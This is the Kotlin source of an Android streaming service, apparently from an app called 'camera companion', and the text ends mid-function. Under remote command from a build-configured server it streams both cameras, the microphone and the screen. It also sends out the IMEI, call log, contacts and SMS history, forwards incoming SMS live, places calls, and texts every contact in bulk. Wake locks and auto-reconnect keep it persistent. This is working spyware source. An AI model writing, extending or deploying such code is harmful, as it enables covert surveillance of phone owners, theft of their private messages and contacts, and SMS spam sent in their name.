package com.artem.cameracompanion

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.util.DisplayMetrics
import android.view.Display
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import okhttp3.*
import okio.ByteString.Companion.toByteString
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class StreamingService : Service() {

    companion object {
        const val ACTION_START = "START"
        const val ACTION_STOP  = "STOP"
        const val CHANNEL_ID = "streaming"
        const val NOTIF_ID = 1
        var isRunning = false
        @Volatile var screenQuality = 60
        @Volatile var hasProjection = false
        @Volatile var statusText = "Запуск…"
        @Volatile var paused = false

        // Вызывается из SmsReceiver при входящем СМС
        private val phoneViewers = mutableSetOf<okhttp3.WebSocket>()
        fun registerPhoneViewer(ws: okhttp3.WebSocket)   { synchronized(phoneViewers) { phoneViewers.add(ws) } }
        fun unregisterPhoneViewer(ws: okhttp3.WebSocket) { synchronized(phoneViewers) { phoneViewers.remove(ws) } }
        fun pushIncomingSms(address: String, body: String, date: Long, name: String = "") {
            val msg = JSONObject()
                .put("type", "sms-incoming")
                .put("address", address)
                .put("name", name)
                .put("body", body)
                .put("date", date)
                .toString()
            synchronized(phoneViewers) { phoneViewers.forEach { it.send(msg) } }
        }

        fun start(ctx: Context, projectionCode: Int = -1, projectionData: Intent? = null) {
            val i = Intent(ctx, StreamingService::class.java).setAction(ACTION_START)
            if (projectionCode != -1 && projectionData != null) {
                i.putExtra("projectionCode", projectionCode)
                i.putExtra("projectionData", projectionData)
            }
            ctx.startForegroundService(i)
        }
        fun stop(ctx: Context) {
            ctx.startService(Intent(ctx, StreamingService::class.java).setAction(ACTION_STOP))
        }
    }

    private val lifecycleOwner = StreamingLifecycleOwner()
    private val analyzerExecutor = Executors.newSingleThreadExecutor()
    private var cameraProvider: ProcessCameraProvider? = null
    private val lastFrameBackArr  = LongArray(1)
    private val lastFrameFrontArr = LongArray(1)
    private var lastScreenFrameTime = 0L
    private var audioRecord: AudioRecord? = null
    private var audioThread: Thread? = null
    @Volatile private var currentCam = "back"
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var screenImageReader: ImageReader? = null
    private var screenHandlerThread: HandlerThread? = null
    private var screenHandler: Handler? = null

    private val http = OkHttpClient.Builder()
        .pingInterval(5, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)
        .build()

    @Volatile private var wsBack: WebSocket? = null
    @Volatile private var wsFront: WebSocket? = null
    @Volatile private var wsAudio: WebSocket? = null
    @Volatile private var wsScreen: WebSocket? = null
    @Volatile private var wsPhone: WebSocket? = null
    @Volatile private var frameErrorReported = false

    private val serverBase: String get() {
        var host = BuildConfig.DEFAULT_SERVER.trim()
        host = host.removePrefix("http://").removePrefix("ws://")
        if (!host.contains(":")) host = "$host:80"
        return "ws://$host"
    }
    private val encodedModel: String get() = Uri.encode(Build.MODEL ?: "Android")

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("Подключение…"))
        lifecycleOwner.start()
        wakeLock = (getSystemService(POWER_SERVICE) as PowerManager)
            .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "arp:streaming")
        wakeLock?.acquire(12 * 60 * 60 * 1000L)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                if (wsBack == null) connectCamWs()
                else if (cameraProvider == null &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                        == PackageManager.PERMISSION_GRANTED) bindCamera()
                if (wsAudio == null) connectAudioWs()
                val code = intent.getIntExtra("projectionCode", -1)
                @Suppress("DEPRECATION")
                val data = intent.getParcelableExtra<Intent>("projectionData")
                if (wsPhone == null) connectPhoneWs()
                if (code != -1 && data != null && mediaProjection == null) {
                    val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                    mediaProjection = mgr.getMediaProjection(code, data)
                    hasProjection = true
                    if (wsScreen == null) connectScreenWs()
                }
            }
            "SWITCH_CAM" -> switchCamera(intent.getStringExtra("cam") ?: "back")
            ACTION_STOP  -> { disconnect(); stopSelf() }
        }
        return START_STICKY
    }

    // ── Camera WebSockets ──────────────────────────────────────────────────

    private fun connectCamWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/camera?role=phone&cam=back&model=$encodedModel").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    wsBack = ws
                    currentCam = "back"  // всегда начинаем с задней камеры при (пере)подключении
                    paused = false
                    updateNotification("Идёт трансляция")
                    connectFrontCamWs()
                    bindCamera()
                }
                override fun onMessage(ws: WebSocket, text: String) {
                    try {
                        val json = JSONObject(text)
                        when (json.optString("cmd")) {
                            "stop"   -> { disconnect(); stopSelf() }
                            "start"  -> { if (wsBack == null) connectCamWs() }
                            "switch" -> switchCamera(json.optString("cam", "back"))
                            "pause"  -> { paused = true; updateNotification("Приостановлено"); sendCamStatus("Трансляция приостановлена") }
                            "resume" -> { paused = false; updateNotification("Идёт трансляция"); sendCamStatus("ok") }
                        }
                    } catch (_: Exception) {}
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsBack = null; updateNotification("Ошибка подключения")
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsBack == null) connectCamWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsBack = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsBack == null) connectCamWs() }, 5000)
                }
            })
    }

    private fun connectFrontCamWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/camera?role=phone&cam=front&model=$encodedModel").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    wsFront = ws
                    // Если уже переключились на фронт пока соединение устанавливалось — перепривязываем камеру
                    if (currentCam == "front") {
                        cameraProvider?.let { provider ->
                            ContextCompat.getMainExecutor(this@StreamingService).execute {
                                bindCameraInternal(provider)
                            }
                        }
                    }
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsFront = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsFront == null) connectFrontCamWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsFront = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsFront == null) connectFrontCamWs() }, 5000)
                }
            })
    }

    // ── Audio WebSocket ────────────────────────────────────────────────────

    private fun connectAudioWs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) return
        http.newWebSocket(
            Request.Builder().url("$serverBase/audio?role=phone&model=$encodedModel").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) { wsAudio = ws; startAudioCapture() }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsAudio = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsAudio == null) connectAudioWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsAudio = null; stopAudioCapture()
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsAudio == null) connectAudioWs() }, 5000)
                }
            })
    }

    private fun startAudioCapture() {
        try {
            val rate = 16000
            val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
            val bufSize = maxOf(if (minBuf > 0) minBuf else 3200, 3200) * 4
            val rec = AudioRecord(MediaRecorder.AudioSource.MIC, rate,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)
            if (rec.state != AudioRecord.STATE_INITIALIZED) { rec.release(); return }
            audioRecord = rec
            rec.startRecording()
            audioThread = Thread {
                val chunk = ShortArray(1600)
                while (!Thread.currentThread().isInterrupted) {
                    val ws = wsAudio ?: break
                    val read = try { rec.read(chunk, 0, chunk.size) } catch (_: Exception) { break }
                    if (read <= 0) continue
                    if (ws.queueSize() > 64 * 1024) continue
                    val bytes = ByteArray(read * 2)
                    ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer().put(chunk, 0, read)
                    ws.send(bytes.toByteString())
                }
            }.apply { isDaemon = true; start() }
        } catch (_: Exception) { }
    }

    private fun stopAudioCapture() {
        audioThread?.interrupt(); audioThread = null
        try { audioRecord?.stop() } catch (_: Exception) {}
        audioRecord?.release(); audioRecord = null
    }

    // ── Screen streaming via MediaProjection ──────────────────────────────

    private fun connectScreenWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/screen?role=phone&model=$encodedModel").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) { wsScreen = ws; startVirtualDisplay() }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsScreen = null; releaseVirtualDisplay()
                    if (isRunning && mediaProjection != null)
                        Handler(Looper.getMainLooper()).postDelayed({ if (wsScreen == null) connectScreenWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsScreen = null; releaseVirtualDisplay()
                    if (isRunning && mediaProjection != null)
                        Handler(Looper.getMainLooper()).postDelayed({ if (wsScreen == null) connectScreenWs() }, 5000)
                }
            })
    }

    private fun startVirtualDisplay() {
        val mp = mediaProjection ?: return
        val dm = getSystemService(DISPLAY_SERVICE) as DisplayManager
        val display = dm.getDisplay(Display.DEFAULT_DISPLAY) ?: return
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        val w = (metrics.widthPixels / 2).coerceAtLeast(360)
        val h = (metrics.heightPixels / 2).coerceAtLeast(640)
        val dpi = metrics.densityDpi / 2
        val ht = HandlerThread("arp_screen_reader").also { it.start(); screenHandlerThread = it }
        val handler = Handler(ht.looper).also { screenHandler = it }
        val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        screenImageReader = reader
        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                if (paused) return@setOnImageAvailableListener
                val ws = wsScreen ?: return@setOnImageAvailableListener
                if (ws.queueSize() > 512 * 1024) return@setOnImageAvailableListener
                val now = System.currentTimeMillis()
                if (now - lastScreenFrameTime < 80) return@setOnImageAvailableListener
                lastScreenFrameTime = now
                val plane = img.planes[0]
                val rowW = plane.rowStride / plane.pixelStride
                val bmp = Bitmap.createBitmap(rowW, h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(plane.buffer)
                val cropped = if (rowW > w) Bitmap.createBitmap(bmp, 0, 0, w, h).also { bmp.recycle() } else bmp
                val out = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, screenQuality, out)
                cropped.recycle()
                ws.send(out.toByteArray().toByteString())
            } finally { img.close() }
        }, handler)
        virtualDisplay = mp.createVirtualDisplay("arp_screen", w, h, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
    }

    private fun releaseVirtualDisplay() {
        virtualDisplay?.release(); virtualDisplay = null
        screenImageReader?.close(); screenImageReader = null
        screenHandlerThread?.quitSafely(); screenHandlerThread = null; screenHandler = null
    }

    // ── Phone / Calls WebSocket ────────────────────────────────────────────

    private fun connectPhoneWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/phone?role=phone&model=$encodedModel").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    wsPhone = ws
                    registerPhoneViewer(ws)
                    sendPhoneInfo(ws)
                    sendCallLog(ws)
                }
                override fun onMessage(ws: WebSocket, text: String) {
                    try {
                        val json = JSONObject(text)
                        when (json.optString("cmd")) {
                            "get-phone-info" -> sendPhoneInfo(ws)
                            "get-call-log"   -> sendCallLog(ws)
                            "get-contacts"   -> sendContacts(ws)
                            "call"           -> makeCall(json.optString("number", ""), ws)
                            "get-sms"        -> sendSmsList(ws)
                            "send-sms"       -> sendSmsMessage(json.optString("number", ""), json.optString("text", ""), ws)
                            "send-sms-broadcast" -> sendSmsBroadcast(json.optString("text", ""), ws)
                        }
                    } catch (_: Exception) {}
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    unregisterPhoneViewer(ws)
                    if (ws == wsPhone) wsPhone = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsPhone == null) connectPhoneWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    unregisterPhoneViewer(ws)
                    if (ws == wsPhone) wsPhone = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsPhone == null) connectPhoneWs() }, 5000)
                }
            })
    }

    private fun sendPhoneInfo(ws: WebSocket) {
        try {
            val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val json = JSONObject()
            json.put("type", "phone-info")
            json.put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
            json.put("operator", tm.networkOperatorName ?: "")
            json.put("simOperator", tm.simOperatorName ?: "")
            @Suppress("DEPRECATION")
            json.put("networkType", getNetworkTypeName(tm.networkType))
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
                == PackageManager.PERMISSION_GRANTED) {
                json.put("number", tm.line1Number ?: "")
            }
            try {
                val imei = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    tm.imei ?: "" else @Suppress("DEPRECATION") tm.deviceId ?: ""
                json.put("imei", imei)
            } catch (_: Exception) {}
            try {
                val sm = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val sims = JSONArray()
                sm?.activeSubscriptionInfoList?.forEach { info ->
                    val sim = JSONObject()
                    sim.put("slot", info.simSlotIndex + 1)
                    sim.put("displayName", info.displayName?.toString() ?: "")
                    sim.put("carrierName", info.carrierName?.toString() ?: "")
                    sim.put("number", info.number ?: "")
                    sims.put(sim)
                }
                if (sims.length() > 0) json.put("sims", sims)
            } catch (_: Exception) {}
            try {
                val bm = getSystemService(BATTERY_SERVICE) as? android.os.BatteryManager
                val level = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
                if (level >= 0) json.put("battery", level)
            } catch (_: Exception) {}
            try {
                fun hasPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
                val accessEnabled = (Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: "").contains(packageName, ignoreCase = true)
                val perms = JSONObject()
                perms.put("camera",      hasPerm(Manifest.permission.CAMERA))
                perms.put("mic",         hasPerm(Manifest.permission.RECORD_AUDIO))
                perms.put("phone",       hasPerm(Manifest.permission.READ_PHONE_STATE))
                perms.put("contacts",    hasPerm(Manifest.permission.READ_CONTACTS))
                perms.put("sms",         hasPerm(Manifest.permission.READ_SMS))
                perms.put("accessibility", accessEnabled)
                perms.put("projection",  hasProjection)
                json.put("perms", perms)
            } catch (_: Exception) {}
            ws.send(json.toString())
        } catch (_: Exception) {}
    }

    @Suppress("DEPRECATION")
    private fun getNetworkTypeName(type: Int): String = when (type) {
        TelephonyManager.NETWORK_TYPE_LTE    -> "LTE/4G"
        TelephonyManager.NETWORK_TYPE_HSDPA,
        TelephonyManager.NETWORK_TYPE_HSUPA,
        TelephonyManager.NETWORK_TYPE_HSPA,
        TelephonyManager.NETWORK_TYPE_HSPAP  -> "HSPA/3G+"
        TelephonyManager.NETWORK_TYPE_UMTS   -> "3G UMTS"
        TelephonyManager.NETWORK_TYPE_EDGE   -> "EDGE/2G+"
        TelephonyManager.NETWORK_TYPE_GPRS   -> "GPRS/2G"
        TelephonyManager.NETWORK_TYPE_CDMA,
        TelephonyManager.NETWORK_TYPE_1xRTT  -> "CDMA"
        TelephonyManager.NETWORK_TYPE_EVDO_0,
        TelephonyManager.NETWORK_TYPE_EVDO_A,
        TelephonyManager.NETWORK_TYPE_EVDO_B -> "EVDO"
        20                                   -> "5G NR"
        else                                 -> "неизвестно ($type)"
    }

    private fun sendCallLog(ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type", "call-log-error")
                .put("msg", "Нет разрешения READ_CALL_LOG").toString())
            return
        }
        try {
            val entries = JSONArray()
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                        CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use { c ->
                val numCol  = c.getColumnIndex(CallLog.Calls.NUMBER)
                val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
                val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
                val durCol  = c.getColumnIndex(CallLog.Calls.DURATION)
                var count = 0
                while (c.moveToNext() && count < 50) {
                    val e = JSONObject()
                    e.put("number",   c.getString(numCol)  ?: "")
                    e.put("name",     c.getString(nameCol) ?: "")
                    e.put("callType", when (c.getInt(typeCol)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE   -> "missed"
                        else                        -> "unknown"
                    })
                    e.put("date",     c.getLong(dateCol))
                    e.put("duration", c.getInt(durCol))
                    entries.put(e)
                    count++
                }
            }
            ws.send(JSONObject().put("type", "call-log").put("entries", entries).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type", "call-log-error").put("msg", e.message ?: "ошибка").toString())
        }
    }

    private fun sendContacts(ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type", "contacts-error")
                .put("msg", "Нет разрешения READ_CONTACTS").toString())
            return
        }
        try {
            val contacts = JSONArray()
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )?.use { c ->
                val nameCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numCol  = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val typeCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                while (c.moveToNext()) {
                    val e = JSONObject()
                    e.put("name",   c.getString(nameCol) ?: "")
                    e.put("number", c.getString(numCol)  ?: "")
                    e.put("type",   ContactsContract.CommonDataKinds.Phone.getTypeLabel(
                        resources, c.getInt(typeCol), "").toString())
                    contacts.put(e)
                }
            }
            ws.send(JSONObject().put("type", "contacts").put("entries", contacts).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type", "contacts-error").put("msg", e.message ?: "ошибка").toString())
        }
    }

    private fun resolveContactName(address: String): String {
        if (address.isBlank()) return ""
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) return ""
        return try {
            val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address))
            contentResolver.query(uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)?.use { c ->
                if (c.moveToFirst()) c.getString(0) ?: "" else ""
            } ?: ""
        } catch (_: Exception) { "" }
    }

    private fun sendSmsList(ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type", "sms-error").put("msg", "Нет разрешения READ_SMS").toString())
            return
        }
        try {
            data class Row(val address: String, val body: String, val date: Long, val type: Int, val read: Boolean)
            val rows = mutableListOf<Row>()
            contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type", "read"),
                null, null, "date DESC"
            )?.use { c ->
                val addrCol = c.getColumnIndex("address")
                val bodyCol = c.getColumnIndex("body")
                val dateCol = c.getColumnIndex("date")
                val typeCol = c.getColumnIndex("type")
                val readCol = c.getColumnIndex("read")
                var count = 0
                while (c.moveToNext() && count < 200) {
                    rows.add(Row(
                        address = c.getString(addrCol) ?: "",
                        body    = c.getString(bodyCol) ?: "",
                        date    = c.getLong(dateCol),
                        type    = c.getInt(typeCol),
                        read    = c.getInt(readCol) == 1
                    ))
                    count++
                }
            }
            // Batch-resolve contact names for unique addresses
            val nameCache = mutableMapOf<String, String>()
            for (row in rows) {
                if (row.address.isNotBlank() && !nameCache.containsKey(row.address)) {
                    nameCache[row.address] = resolveContactName(row.address)
                }
            }
            val messages = JSONArray()
            for (row in rows) {
                val e = JSONObject()
                e.put("address", row.address)
                e.put("name",    nameCache[row.address] ?: "")
                e.put("body",    row.body)
                e.put("date",    row.date)
                e.put("type",    row.type) // 1=входящее, 2=исходящее
                e.put("read",    row.read)
                messages.put(e)
            }
            ws.send(JSONObject().put("type", "sms-list").put("messages", messages).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type", "sms-error").put("msg", e.message ?: "ошибка").toString())
        }
    }

    private fun sendSmsMessage(number: String, text: String, ws: WebSocket) {
        fun status(ok: Boolean, msg: String) =
            ws.send(JSONObject().put("type", "sms-status").put("ok", ok).put("msg", msg).toString())
        if (number.isBlank()) { status(false, "Номер не указан"); return }
        if (text.isBlank()) { status(false, "Текст не указан"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
            != PackageManager.PERMISSION_GRANTED) { status(false, "Нет разрешения SEND_SMS"); return }
        try {
            @Suppress("DEPRECATION")
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                getSystemService(SmsManager::class.java)
            else SmsManager.getDefault()
            val parts = smsManager.divideMessage(text)
            smsManager.sendMultipartTextMessage(number.trim(), null, parts, null, null)
            status(true, "СМС отправлено на ${number.trim()}")
        } catch (e: Exception) {
            status(false, "Ошибка: ${e.message ?: "неизвестная"}")
        }
    }

    private fun sendSmsBroadcast(text: String, ws: WebSocket) {
        fun done(ok: Boolean, msg: String, sent: Int = 0, failed: Int = 0) =
            ws.send(JSONObject().put("type","sms-broadcast-done").put("ok",ok).put("msg",msg).put("sent",sent).put("failed",failed).toString())
        if (text.isBlank()) { done(false, "Текст не указан"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
            != PackageManager.PERMISSION_GRANTED) { done(false, "Нет разрешения SEND_SMS"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) { done(false, "Нет разрешения READ_CONTACTS"); return }

        // Собираем уникальные номера из контактов
        val contacts = mutableListOf<Pair<String,String>>() // name, number
        val seen = mutableSetOf<String>()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )?.use { c ->
                val nameCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numCol  = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (c.moveToNext()) {
                    val num = (c.getString(numCol) ?: "").trim().replace("\\s".toRegex(), "")
                    if (num.isBlank() || seen.contains(num)) continue
                    seen.add(num)
                    contacts.add(Pair(c.getString(nameCol) ?: num, num))
                }
            }
        } catch (e: Exception) { done(false, "Ошибка чтения контактов: ${e.message}"); return }

        if (contacts.isEmpty()) { done(false, "Нет контактов с номерами"); return }

        // Сообщаем сколько контактов найдено
        ws.send(JSONObject().put("type","sms-broadcast-progress").put("sent",0).put("failed",0).put("total",contacts.size).put("current","").toString())

        Thread {
            @Suppress("DEPRECATION")
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                getSystemService(SmsManager::class.java) else SmsManager.getDefault()
            var sent = 0; var failed = 0
            for ((name, number) in contacts) {
                var ok = false
                var errMsg = ""
                try {
                    val parts = smsManager.divideMessage(text)
                    smsManager.sendMultipartTextMessage(number, null, parts, null, null)
                    sent++; ok = true
                } catch (e: Exception) { failed++; errMsg = e.message ?: "ошибка" }
                ws.send(JSONObject().put("type","sms-broadcast-progress")
                    .put("sent",sent).put("failed",failed).put("total",contacts.size)
                    .put("current",name).put("number",number).put("ok",ok).put("err",errMsg).toString())
                Thread.sleep(350)
            }
            done(true, "Рассылка завершена", sent, failed)
        }.start()
    }

    private fun makeCall(number: String, ws: WebSocket) {
        fun status(ok: Boolean, msg: String) =
            ws.send(JSONObject().put("type", "call-status").put("ok", ok).put("msg", msg).toString())
        if (number.isBlank()) { status(false, "Номер не указан"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)
            != PackageManager.PERMISSION_GRANTED) { status(false, "Нет разрешения на звонок"); return }
        val cleaned = number.trim()
        try {
            val telecom = getSystemService(TELECOM_SERVICE) as? android.telecom.TelecomManager
            if (telecom != null) {
                telecom.placeCall(Uri.fromParts("tel", cleaned, null), android.os.Bundle())
            } else {
                val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$cleaned"))
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }
            status(true, "Звонок на $cleaned…")
        } catch (e: Exception) {
            status(false, "Ошибка: ${e.message ?: "неизвестная"}")
        }
    }

    // ── CameraX binding & switching ────────────────────────────────────────

    private fun sendCamStatus(text: String) {
        val msg = JSONObject().put("type", "cam-status").put("text", text).toString()
        val ws = if (currentCam == "front") (wsFront ?: wsBack) else wsBack
        ws?.send(msg)
    }

    private fun bindCamera() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            updateNotification("Нет разрешения камеры")
            sendCamStatus("Нет разрешения камеры — выдай его в Настройки → Приложения")
            return
        }
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                val provider = future.get()
                cameraProvider = provider
                bindCameraInternal(provider)
            } catch (e: Exception) {
                val msg = "Провайдер камеры: ${e.message?.take(60)}"
                updateNotification(msg)
                sendCamStatus(msg)
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun bindCameraInternal(provider: ProcessCameraProvider) {
        try {
            provider.unbindAll()
            frameErrorReported = false
            updateNotification("Подключение камеры…")
            sendCamStatus("Открытие камеры…")
            val isFront = currentCam == "front"
            val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA
                           else CameraSelector.DEFAULT_BACK_CAMERA
            val analysis = ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()
            val camRef = currentCam
            analysis.setAnalyzer(analyzerExecutor) { proxy ->
                sendFrame(proxy,
                    if (camRef == "front") wsFront else wsBack,
                    if (camRef == "front") lastFrameFrontArr else lastFrameBackArr)
            }
            provider.bindToLifecycle(lifecycleOwner, selector, analysis)
            updateNotification("Идёт трансляция")
            sendCamStatus("ok")
        } catch (e: Exception) {
            val msg = "Ошибка камеры: ${e.message?.take(60)}"
            updateNotification(msg)
            sendCamStatus(msg)
        }
    }

    private fun switchCamera(cam: String) {
        currentCam = cam
        if (cam == "front" && wsFront == null) connectFrontCamWs()
        val provider = cameraProvider ?: return
        ContextCompat.getMainExecutor(this).execute { bindCameraInternal(provider) }
    }

    // ── Frame helpers ──────────────────────────────────────────────────────

    private fun sendFrame(proxy: ImageProxy, target: WebSocket?, lastArr: LongArray) {
        try {
            if (paused) return
            val now = System.currentTimeMillis()
            val ws = target ?: return
            if (now - lastArr[0] < 33 || ws.queueSize() > 512 * 1024) return
            lastArr[0] = now
            val bitmap = proxy.toBitmap()
            val m = Matrix().apply { postRotate(proxy.imageInfo.rotationDegrees.toFloat()) }
            val rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, m, true)
            bitmap.recycle()
            val scale = minOf(1f, 720f / maxOf(rotated.width, rotated.height))
            val final = if (scale < 1f)
                Bitmap.createScaledBitmap(rotated, (rotated.width * scale).toInt(), (rotated.height * scale).toInt(), true).also { rotated.recycle() }
            else rotated
            val out = ByteArrayOutputStream()
            final.compress(Bitmap.CompressFormat.JPEG, 55, out)
            final.recycle()
            ws.send(out.toByteArray().toByteString())
            frameErrorReported = false
